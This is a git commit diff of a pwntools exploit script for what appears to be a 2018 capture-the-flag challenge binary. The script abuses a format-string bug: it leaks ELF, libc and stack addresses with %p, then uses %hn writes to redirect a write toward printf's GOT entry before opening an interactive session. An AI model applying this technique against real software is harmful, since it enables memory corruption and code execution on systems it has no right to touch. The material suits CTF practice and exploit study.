3dcc21980a3bbabe1d63556203b55bb4617f1a79
M4xW4n9 <aboultraman@gmail.com>
2018-06-02 11:04:38 +0800

    redhat2018 final

--- others_redhat/half_finished_fsb_bug.py
+++ others_redhat/half_finished_fsb_bug.py
@@ -12,8 +12,7 @@ if sys.argv[1] == "l":
     context.log_level = "debug"
     # env = {'LD_PRELOAD': ''}
     # io = process("", env = env)
-    #  io = process("./pwn_redhat")
-    io = process("./pwn_redhat_patch_printf")
+    io = process("./pwn_redhat")
     libc = elf.libc
 
 
@@ -27,27 +26,36 @@ def DEBUG(cmd = ""):
     gdb.attach(io, cmd)
 
 if __name__ == "__main__":
-    DEBUG()
-    io.sendlineafter(">>>", "%8$p..%9$p..%11$p..")
-    elfBase = int(io.recvuntil("..", drop = True), 16) - 0x13C0
-    success("elfBase -> {:#x}".format(elfBase))
+    #  DEBUG()
+    info("leak address")
+    io.sendlineafter(">>>", "%8$p..%9$p..%11$p..%25$p..")
+    elf.address = int(io.recvuntil("..", drop = True), 16) - 0x13C0
+    success("elf.address -> {:#x}".format(elf.address))
     libc.address = int(io.recvuntil("..", drop = True), 16) - 241 - libc.sym[u'__libc_start_main']
     success("libc.address -> {:#x}".format(libc.address))
-    stackAddr = int(io.recvuntil("..", drop = True), 16) 
-    success("stackAddr -> {:#x}".format(stackAddr))
-    retAddr = stackAddr - 0xe0
-    success("retAddr -> {:#x}".format(retAddr))
+    stack05 = int(io.recvuntil("..", drop = True), 16) 
+    elf07 = stack05 - 0xc0
+    success("elf07 -> {:#x}".format(elf07))
+    success("stack05 -> {:#x}".format(stack05))
+    stack13 = int(io.recvuntil("..", drop = True), 16)
+    elf0a = stack13 - 0xb8
+    success("elf0a -> {:#x}".format(elf0a))
+    success("stack13 -> {:#x}".format(stack13))
     pause()
 
-    payload = "%{}c%11$hn".format(retAddr & 0xffff)
+    #  DEBUG()
+    info("overwrite stack to elf")
+    payload = "%{}c%{}$hn".format(elf07 & 0xffff, 11)
+    io.sendlineafter(">>>", payload)
+    payload = "%{}c%{}$hn".format(elf0a & 0xffff, 25)
     io.sendlineafter(">>>", payload)
 
-    #  DEBUG()
-    #  io.sendlineafter(">>>", "%36$p.%37$p.%38$p")
-    oneGadget = 0x3f32a + libc.address
-    payload = "%{}c%37$hn".format(oneGadget & 0xffff)
-    #  DEBUG()
+    DEBUG()
+    info("overwrite elf to printf@got")
+    payload = "%{}c%{}$hn".format(elf.got['printf'] & 0xffff, 0x1f + 6)
+    payload += "%{}c%{}$hhn".format(2, 0x21 + 6)
     io.sendlineafter(">>>", payload)
+
 
     io.interactive()
     io.close()
